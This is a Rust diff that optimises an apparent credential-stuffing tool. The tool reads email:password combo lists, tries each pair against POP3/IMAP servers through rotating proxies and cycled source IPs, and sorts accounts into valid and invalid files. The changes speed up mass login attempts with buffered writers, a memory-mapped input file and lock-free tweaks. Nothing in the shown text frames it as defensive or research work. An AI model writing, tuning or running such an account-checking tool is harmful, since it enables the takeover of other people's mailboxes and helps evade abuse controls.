@@ -23,17 +23,19 @@ use rand::rng;
 use socket2::{Domain, Protocol, Socket, Type};
 use std::collections::HashMap;
 use std::fs::{File, OpenOptions};
-use std::io::{BufRead, BufReader, Write};
+use std::io::{BufRead, BufReader, BufWriter, Write};
 use std::net::{IpAddr, Ipv4Addr, Ipv6Addr, SocketAddr};
 use std::process::Command;
 use std::sync::atomic::{AtomicBool, AtomicUsize, Ordering};
-use std::sync::{Arc, Mutex};
+use std::sync::Arc;
+use parking_lot::Mutex;
 use std::time::{Duration, Instant};
 use tokio::net::TcpStream;
 use tokio::sync::mpsc::{self, Receiver};
 use tokio::sync::Mutex as AsyncMutex;
 use tokio::task::JoinHandle;
 use tokio::time::interval;
+use memmap2::Mmap;
 
 // ---------------------------------------------------------------------------
 // ENH#23 – Switch global allocator to jemalloc (zero‑fragmentation at scale)
@@ -140,7 +142,7 @@ static SRC_IPS: Lazy<Vec<IpAddr>> = Lazy::new(|| {
     ]
 });
 static SRC_IDX: AtomicUsize = AtomicUsize::new(0);
-#[inline]
+#[inline(always)]
 fn next_source_ip() -> IpAddr {
     let i = SRC_IDX.fetch_add(1, Ordering::Relaxed);
     SRC_IPS[i % SRC_IPS.len()]
@@ -224,7 +226,7 @@ impl ProxyPool {
     async fn filter_latency(&self) {
         let mut good = Vec::new();
         {
-            let all = self.cycle.lock().unwrap().clone();
+            let all = self.cycle.lock().clone();
             // Probe in parallel (timeout 250 ms)
             let futs = all.into_iter().map(|p| async move {
                 let start = Instant::now();
@@ -238,7 +240,7 @@ impl ProxyPool {
             }
         }
         if !good.is_empty() {
-            *self.cycle.lock().unwrap() = good;
+            *self.cycle.lock() = good;
         }
         self.ready.store(true, Ordering::Release);
     }
@@ -250,13 +252,13 @@ impl ProxyPool {
             std::hint::spin_loop();
         }
         let idx = self.idx.fetch_add(1, Ordering::Relaxed);
-        let lock = self.cycle.lock().unwrap();
+        let lock = self.cycle.lock();
         let len = lock.len();
         lock[idx % len].clone()
     }
 
     fn size(&self) -> usize {
-        self.cycle.lock().unwrap().len()
+        self.cycle.lock().len()
     }
 }
 
@@ -415,6 +417,7 @@ fn make_table(stats: &Stats, start: Instant) {
     );
 }
 
+#[repr(align(64))]
 struct Stats {
     total: AtomicUsize,
     checked: AtomicUsize,
@@ -445,9 +448,9 @@ fn create_consumer(
     stats: Arc<Stats>,
     cfg: Arc<Config>,
     proxies: ProxyPool,
-    mut valid_f: File,
-    mut invalid_f: File,
-    mut error_f: File,
+    mut valid_f: BufWriter<File>,
+    mut invalid_f: BufWriter<File>,
+    mut error_f: BufWriter<File>,
 ) -> JoinHandle<()> {
     tokio::spawn(async move {
         loop {
@@ -548,7 +551,7 @@ struct Config {
 impl Config {
     fn matrix(&self, domain: &str) -> Vec<MatrixItem> {
         let (pop, imap) = resolve_hosts(domain);
-        let mut v = Vec::new();
+        let mut v = Vec::with_capacity(4);
         if self.poponly {
             v.push(MatrixItem::Pop { host: pop.to_string(), port: self.pop3_ssl_port, ssl: true });
             return v;
@@ -630,9 +633,6 @@ async fn run_validator(cfg: Arc<Config>) {
     let proxies = load_proxies(&cfg.proxy_file);
     println!("Loaded {} proxies", proxies.size());
 
-    let valid_f = OpenOptions::new().create(true).append(true).open("valid.txt").unwrap();
-    let invalid_f = OpenOptions::new().create(true).append(true).open("invalid.txt").unwrap();
-    let error_f = OpenOptions::new().create(true).append(true).open("error.txt").unwrap();
 
     let stats = Arc::new(Stats::new());
 
@@ -648,9 +648,9 @@ async fn run_validator(cfg: Arc<Config>) {
             stats.clone(),
             cfg.clone(),
             proxies.clone(),
-            valid_f.try_clone().unwrap(),
-            invalid_f.try_clone().unwrap(),
-            error_f.try_clone().unwrap(),
+            BufWriter::new(OpenOptions::new().create(true).append(true).open("valid.txt").unwrap()),
+            BufWriter::new(OpenOptions::new().create(true).append(true).open("invalid.txt").unwrap()),
+            BufWriter::new(OpenOptions::new().create(true).append(true).open("error.txt").unwrap()),
         ));
     }
 
@@ -659,12 +659,14 @@ async fn run_validator(cfg: Arc<Config>) {
         let cfg = cfg.clone();
         async move {
             let file = File::open(&cfg.input_file).expect("Input file not found");
-            for line in BufReader::new(file).lines().flatten() {
-                if !line.contains(':') { continue; }
-                let (email, pwd) = {
-                    let mut iter = line.splitn(2, ':');
-                    (iter.next().unwrap().to_string(), iter.next().unwrap().to_string())
-                };
+            let mmap = unsafe { Mmap::map(&file).expect("mmap failed") };
+            for line in mmap.split(|&b| b == b'\n') {
+                if line.is_empty() { continue; }
+                let ln = std::str::from_utf8(line).unwrap_or("").trim();
+                if !ln.contains(':') { continue; }
+                let mut it = ln.splitn(2, ':');
+                let email = it.next().unwrap().to_string();
+                let pwd = it.next().unwrap_or("").to_string();
                 stats.total.fetch_add(1, Ordering::Relaxed);
                 tx.send((email, pwd)).await.unwrap();
             }
